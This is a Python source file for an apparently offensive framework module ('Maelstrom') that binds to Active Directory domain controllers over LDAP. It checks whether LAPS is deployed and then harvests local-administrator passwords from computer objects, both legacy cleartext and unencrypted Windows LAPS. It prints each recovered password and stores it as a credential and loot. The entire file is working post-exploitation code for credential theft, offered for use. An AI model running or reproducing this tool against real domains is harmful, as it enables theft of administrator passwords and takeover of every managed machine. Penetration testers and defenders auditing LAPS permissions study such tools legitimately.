"""LAPS enumeration and password recovery (Maelstrom's laps).

The Local Administrator Password Solution stores each managed machine's
local-admin password in AD, on the computer object, ACL'd so only
explicitly delegated principals (and Domain Admins) can read it. Two
flavors exist:

  - legacy LAPS: ms-Mcs-AdmPwd — the password in CLEARTEXT. If you can
    read it, you have local admin on every managed box.
  - Windows LAPS (2023+): msLAPS-Password — a JSON blob, optionally
    encrypted (encrypted form needs the DC + the right group to unwrap).

The first question is always "is LAPS even deployed?" — the attributes
only exist in the schema when an extension added them, so this module
checks the schema before hunting values. Passwords land in the store as
creds (host Administrator) and loot.
"""

import json
import time

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

SCHEMA_FILTER = ("(|(lDAPDisplayName=ms-Mcs-AdmPwd)"
                 "(lDAPDisplayName=msLAPS-Password))")
HARVEST_ATTRS = ["sAMAccountName", "dNSHostName", "ms-Mcs-AdmPwd",
                 "ms-Mcs-AdmPwdExpirationTime", "msLAPS-Password"]
HARVEST_FILTER = ("(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)"
                  "(msLAPS-Password=*)))")

FILETIME_EPOCH_OFFSET = 11644473600  # seconds 1601 -> 1970


def domain_to_base(domain):
    """forge.local -> DC=forge,DC=local"""
    return ",".join(f"DC={part}" for part in domain.split("."))


def entry_to_dict(entry):
    """SearchResultEntry -> {attribute: [string values]}."""
    out = {}
    for attr in entry["attributes"]:
        out[str(attr["type"])] = [str(v) for v in attr["vals"]]
    return out


def filetime_to_epoch(raw):
    """AD FILETIME (100-ns ticks since 1601, as a string) -> unix epoch.
    0 means 'never expires'."""
    try:
        ticks = int(raw)
    except (ValueError, TypeError):
        return 0
    if ticks == 0:
        return 0
    return max(ticks // 10_000_000 - FILETIME_EPOCH_OFFSET, 0)


def parse_laps_json(text):
    """Windows LAPS JSON blob -> (account, password), or None.

    Unencrypted form: {"n":"Administrator","t":"1d8...","p":"s3cret"}.
    The encrypted form is a different shape and returns None here —
    the caller reports it as encrypted, not as garbage."""
    try:
        data = json.loads(text)
    except (ValueError, TypeError):
        return None
    account = data.get("n")
    password = data.get("p")
    if account and password:
        return account, password
    return None


class LapsDump(AuxiliaryModule):
    name = "LAPS Enumeration + Password Recovery (LDAP)"
    description = """
        Answers "is LAPS deployed?" from the schema, then harvests
        local-admin passwords from computer objects the caller may read:
        legacy ms-Mcs-AdmPwd (cleartext) and Windows-LAPS msLAPS-Password
        (JSON; encrypted blobs are reported, not cracked). Passwords land
        in the store as creds and loot. Expired passwords are flagged.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s), comma-separated"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Domain user (delegated LAPS reader, or DA)"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        base = domain_to_base(domain)
        user = str(self.get_option("USERNAME") or "")
        password = str(self.get_option("PASSWORD") or "")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._enum(host, domain, base, user, password)

    def _enum(self, host, domain, base, user, password):
        try:
            # impacket's LDAPConnection doesn't parse ports from URLs —
            # AD LDAP is 389 by definition, so the lab binds it 1:1.
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind as {user} failed - {e}")
            return
        self.print_status(f"{host}: bound to {domain} as {user}")

        schema_base = f"CN=Schema,CN=Configuration,{base}"
        laps_attrs = [a.get("lDAPDisplayName", ["?"])[0]
                      for a in self._search(conn, schema_base, SCHEMA_FILTER,
                                            ["lDAPDisplayName"])]
        if not laps_attrs:
            self.print_status(f"{host}: no LAPS schema — LAPS not deployed "
                              "on this domain")
            return
        self.print_good(f"{host}: LAPS schema present ({', '.join(laps_attrs)})")

        store = getattr(self.framework, "store", None)
        found = 0
        for attrs in self._search(conn, base, HARVEST_FILTER, HARVEST_ATTRS):
            found += 1
            name = attrs.get("sAMAccountName", ["?"])[0].rstrip("$")
            dns = attrs.get("dNSHostName", [""])[0] or name
            self._harvest(host, name, dns, attrs, store)
        if found == 0:
            self.print_status(f"{host}: LAPS deployed but no computer has a "
                              "password set (or none readable as "f"{user})")

    def _harvest(self, host, name, dns, attrs, store):
        legacy = attrs.get("ms-Mcs-AdmPwd", [None])[0]
        windows = attrs.get("msLAPS-Password", [None])[0]
        expiry_raw = attrs.get("ms-Mcs-AdmPwdExpirationTime", ["0"])[0]
        expired = 0 < filetime_to_epoch(expiry_raw) < time.time()
        tag = "  (EXPIRED)" if expired else ""

        if legacy:
            self.print_good(f"{dns}: Administrator : {legacy}{tag}")
            if store is not None:
                store.add_cred(dns, "smb", "Administrator", legacy,
                               source="laps")
                store.add_loot("laps", f"{dns} @ {host}",
                               f"{dns}\tAdministrator\t{legacy}", address=host)
        elif windows:
            parsed = parse_laps_json(windows)
            if parsed:
                account, password = parsed
                self.print_good(f"{dns}: {account} : {password}{tag}")
                if store is not None:
                    store.add_cred(dns, "smb", account, password,
                                   source="laps")
                    store.add_loot("laps", f"{dns} @ {host}",
                                   f"{dns}\t{account}\t{password}", address=host)
            else:
                self.print_status(f"{dns}: Windows-LAPS password is encrypted "
                                  "(needs DC unwrap) or unparsable")
        self.print_debug(f"{host}: {dns} raw={attrs}")

    def _search(self, conn, base, search_filter, attributes):
        for packet in conn.search(searchBase=base, searchFilter=search_filter,
                                  attributes=attributes):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                yield entry_to_dict(packet)
